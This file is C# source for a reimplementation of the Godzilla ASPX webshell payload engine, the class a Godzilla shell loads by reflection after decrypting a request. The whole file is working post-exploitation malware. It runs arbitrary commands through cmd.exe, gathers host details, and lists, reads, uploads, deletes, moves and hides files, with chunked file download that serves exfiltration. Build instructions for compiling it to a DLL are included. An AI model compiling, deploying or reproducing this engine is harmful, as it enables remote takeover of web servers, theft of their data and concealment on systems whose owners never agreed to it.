// Matrix-owned Godzilla ASPX payload engine.
//
// This is the engine, not the shell stub. The standard Godzilla ASPX shell does:
//
//   var assembly = System.Reflection.Assembly.Load(decryptedBytes);
//   var o = assembly.CreateInstance("LY");
//   o.Equals(outStream);      // MemoryStream
//   o.Equals(appcontext);     // HttpContext
//   o.Equals(decryptedBytes);
//   o.ToString();
//
// Contract: the same methodName API as Godzilla's own engine.
//
// Build (Windows / any host with .NET Framework csc):
//   csc /target:library /out:matrix_godzilla.dll MatrixGodzillaEngine.cs
//
// NOTE: data/godzilla/matrix_godzilla.dll.b64 is built from this source with
// csc (Windows) or mcs (Mono) and checked in. Regenerate it with
// tool/godzilla_engine/build.sh on a host that has a .NET compiler.

using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Text;

public class LY
{
    private Stream output;
    private object context;
    private Dictionary<string, byte[]> parameters = new Dictionary<string, byte[]>();
    private byte[] requestData;

    public override bool Equals(object obj)
    {
        if (obj == null) return false;
        if (obj is Stream) { this.output = (Stream)obj; return true; }
        if (obj is byte[]) { this.requestData = (byte[])obj; Run(); return true; }
        this.context = obj;
        Run();
        return true;
    }

    public override string ToString() { return ""; }

    private void Run()
    {
        byte[] data = this.requestData;
        if (data == null)
        {
            data = GetAttribute("parameters");
        }
        if (data == null) return;
        byte[] result = Dispatch(data);
        WriteGzip(result);
    }

    private byte[] GetAttribute(string name)
    {
        try
        {
            object ctx = this.context;
            if (ctx == null) return null;
            object request = ctx.GetType().GetProperty("Request").GetValue(ctx, null);
            if (request == null) return null;
            object value = request.GetType().GetMethod("get_Item", new Type[] { typeof(string) })
                .Invoke(request, new object[] { name });
            return value as byte[];
        }
        catch { return null; }
    }

    private void WriteGzip(byte[] data)
    {
        if (output == null) return;
        try
        {
            using (var gz = new GZipStream(output, CompressionMode.Compress, true))
            {
                gz.Write(data, 0, data.Length);
            }
        }
        catch
        {
            try { output.Write(data, 0, data.Length); } catch { }
        }
    }

    // ----------------------------------------------------------------
    // Parameter codec: name + 0x02 + len(int32 LE) + value
    // ----------------------------------------------------------------

    private static Dictionary<string, byte[]> Parse(byte[] data)
    {
        var map = new Dictionary<string, byte[]>();
        var key = new StringBuilder();
        int i = 0;
        while (i < data.Length)
        {
            int b = data[i] & 0xff;
            if (b == 0x02)
            {
                if (i + 5 > data.Length) break;
                int len = (data[i + 1] & 0xff)
                        | ((data[i + 2] & 0xff) << 8)
                        | ((data[i + 3] & 0xff) << 16)
                        | ((data[i + 4] & 0xff) << 24);
                i += 5;
                if (len < 0 || i + len > data.Length) break;
                byte[] value = new byte[len];
                Array.Copy(data, i, value, 0, len);
                map[key.ToString()] = value;
                key.Length = 0;
                i += len;
            }
            else
            {
                key.Append((char)b);
                i++;
            }
        }
        return map;
    }

    private static byte[] MaybeGunzip(byte[] data)
    {
        if (data == null || data.Length < 2) return data ?? new byte[0];
        if ((data[0] & 0xff) != 0x1f || (data[1] & 0xff) != 0x8b) return data;
        try
        {
            using (var gz = new GZipStream(new MemoryStream(data), CompressionMode.Decompress))
            using (var outStream = new MemoryStream())
            {
                byte[] buffer = new byte[8192];
                int n;
                while ((n = gz.Read(buffer, 0, buffer.Length)) > 0)
                {
                    outStream.Write(buffer, 0, n);
                }
                return outStream.ToArray();
            }
        }
        catch { return data; }
    }

    private static string Str(Dictionary<string, byte[]> map, string key)
    {
        byte[] value;
        if (!map.TryGetValue(key, out value) || value == null) return null;
        return Encoding.UTF8.GetString(value);
    }

    private static byte[] Bytes(string value) { return Encoding.UTF8.GetBytes(value ?? ""); }

    // ----------------------------------------------------------------
    // Dispatch
    // ----------------------------------------------------------------

    private byte[] Dispatch(byte[] raw)
    {
        try
        {
            parameters = Parse(MaybeGunzip(raw));
            string method = Str(parameters, "methodName");
            if (method == null) return Bytes("methodName is null");
            switch (method)
            {
                case "getBasicsInfo": return Bytes(Basics());
                case "execCommand": return ExecCommand();
                case "getFile": return Bytes(GetFile(Str(parameters, "dirName")));
                case "readFile":
                case "readFileContent": return ReadFile(Str(parameters, "fileName"));
                case "uploadFile": return Bytes(UploadFile(Str(parameters, "fileName")));
                case "newFile": return Bytes(NewFile(Str(parameters, "fileName")));
                case "newDir": return Bytes(NewDir(Str(parameters, "dirName")));
                case "deleteFile": return Bytes(Delete(Str(parameters, "fileName")));
                case "copyFile": return Bytes(Copy(Str(parameters, "srcFileName"), Str(parameters, "destFileName")));
                case "moveFile": return Bytes(Move(Str(parameters, "srcFileName"), Str(parameters, "destFileName")));
                case "setFileAttr": return Bytes(SetFileAttr(Str(parameters, "type"), Str(parameters, "fileName"), Str(parameters, "attr")));
                case "bigFileDownload": return BigDownload();
                case "bigFileUpload": return Bytes(BigUpload());
                case "test": return Bytes("ok");
                default: return Bytes("unknown method: " + method);
            }
        }
        catch (Exception e)
        {
            return Bytes("Exception: " + e.Message);
        }
    }

    private string Basics()
    {
        var sb = new StringBuilder();
        sb.Append("OsInfo : ").Append(Environment.OSVersion).Append('\n');
        sb.Append("CurrentUser : ").Append(Environment.UserName).Append('\n');
        sb.Append("CurrentDir : ").Append(Environment.CurrentDirectory).Append('\n');
        sb.Append("FileRoot : ").Append(Path.GetPathRoot(Environment.CurrentDirectory)).Append('\n');
        sb.Append("ProcessArch : ").Append(Environment.Is64BitProcess ? "64" : "32").Append('\n');
        sb.Append("TempDirectory : ").Append(Path.GetTempPath()).Append('\n');
        sb.Append("Version : ").Append(Environment.Version).Append('\n');
        sb.Append("MachineName : ").Append(Environment.MachineName).Append('\n');
        return sb.ToString();
    }

    private byte[] ExecCommand()
    {
        string cmdLine = Str(parameters, "cmdLine");
        if (string.IsNullOrEmpty(cmdLine)) return Bytes("no command");
        var psi = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + cmdLine);
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;
        using (var p = System.Diagnostics.Process.Start(psi))
        {
            string stdout = p.StandardOutput.ReadToEnd();
            string stderr = p.StandardError.ReadToEnd();
            p.WaitForExit();
            return Bytes(stdout + stderr);
        }
    }

    private string GetFile(string dir)
    {
        if (string.IsNullOrEmpty(dir)) dir = Environment.CurrentDirectory;
        var info = new DirectoryInfo(dir);
        if (!info.Exists) return "Path Not Found Or No Permission!";
        var sb = new StringBuilder("ok\n");
        sb.Append(info.FullName.Replace('\\', '/')).Append("/\n");
        foreach (var f in info.GetFiles())
        {
            sb.Append(f.Name).Append('\t').Append("1\t")
              .Append(f.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")).Append('\t')
              .Append(f.Length).Append('\t').Append("RW").Append('\n');
        }
        foreach (var d in info.GetDirectories())
        {
            sb.Append(d.Name).Append('\t').Append("0\t")
              .Append(d.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")).Append('\t')
              .Append("0").Append('\t').Append("RW").Append('\n');
        }
        return sb.ToString();
    }

    private byte[] ReadFile(string path)
    {
        if (string.IsNullOrEmpty(path) || !File.Exists(path)) return Bytes("File Not Found");
        return File.ReadAllBytes(path);
    }

    private string UploadFile(string path)
    {
        byte[] value;
        parameters.TryGetValue("fileValue", out value);
        if (string.IsNullOrEmpty(path)) return "fail";
        File.WriteAllBytes(path, value ?? new byte[0]);
        return "ok";
    }

    private string NewFile(string path)
    {
        if (string.IsNullOrEmpty(path)) return "fail";
        if (!File.Exists(path)) File.Create(path).Close();
        return "ok";
    }

    private string NewDir(string path)
    {
        if (string.IsNullOrEmpty(path)) return "fail";
        Directory.CreateDirectory(path);
        return "ok";
    }

    private string Delete(string path)
    {
        if (string.IsNullOrEmpty(path)) return "fail";
        try
        {
            if (Directory.Exists(path)) Directory.Delete(path, true);
            else if (File.Exists(path)) File.Delete(path);
            else return "fail";
            return "ok";
        }
        catch { return "fail"; }
    }

    private string Copy(string src, string dst)
    {
        if (string.IsNullOrEmpty(src) || string.IsNullOrEmpty(dst)) return "fail";
        File.Copy(src, dst, true);
        return "ok";
    }

    private string Move(string src, string dst)
    {
        if (string.IsNullOrEmpty(src) || string.IsNullOrEmpty(dst)) return "fail";
        File.Copy(src, dst, true);
        File.Delete(src);
        return "ok";
    }

    private string SetFileAttr(string type, string path, string attr)
    {
        if (string.IsNullOrEmpty(path)) return "fail";
        try
        {
            FileAttributes fa = (FileAttributes)0;
            string a = (attr ?? "").ToUpperInvariant();
            if (a.Contains("R")) fa |= FileAttributes.ReadOnly;
            if (a.Contains("H")) fa |= FileAttributes.Hidden;
            if (a.Contains("S")) fa |= FileAttributes.System;
            if (a.Contains("A")) fa |= FileAttributes.Archive;
            if (fa == (FileAttributes)0) fa = FileAttributes.Normal;
            File.SetAttributes(path, fa);
            return "ok";
        }
        catch { return "fail"; }
    }

    private byte[] BigDownload()
    {
        string path = Str(parameters, "fileName");
        string mode = Str(parameters, "mode");
        if (string.IsNullOrEmpty(path) || !File.Exists(path)) return Bytes("File Not Found");
        if (mode == "fileSize") return Bytes(new FileInfo(path).Length.ToString());
        if (mode != "read") return Bytes("no mode");
        long position = 0;
        long.TryParse(Str(parameters, "position") ?? "0", out position);
        int num = 1048576;
        int.TryParse(Str(parameters, "readByteNum") ?? "1048576", out num);
        using (var fs = new FileStream(path, FileMode.Open, FileAccess.Read))
        {
            fs.Seek(position, SeekOrigin.Begin);
            byte[] buffer = new byte[num];
            int read = fs.Read(buffer, 0, num);
            if (read <= 0) return new byte[0];
            byte[] result = new byte[read];
            Array.Copy(buffer, result, read);
            return result;
        }
    }

    private string BigUpload()
    {
        string path = Str(parameters, "fileName");
        byte[] contents;
        parameters.TryGetValue("fileContents", out contents);
        if (string.IsNullOrEmpty(path)) return "fail";
        string position = Str(parameters, "position");
        if (string.IsNullOrEmpty(position))
        {
            File.WriteAllBytes(path, contents ?? new byte[0]);
            return "ok";
        }
        long pos = long.Parse(position.Trim());
        using (var fs = new FileStream(path, FileMode.OpenOrCreate, FileAccess.Write))
        {
            fs.Seek(pos, SeekOrigin.Begin);
            fs.Write(contents ?? new byte[0], 0, (contents ?? new byte[0]).Length);
        }
        return "ok";
    }
}
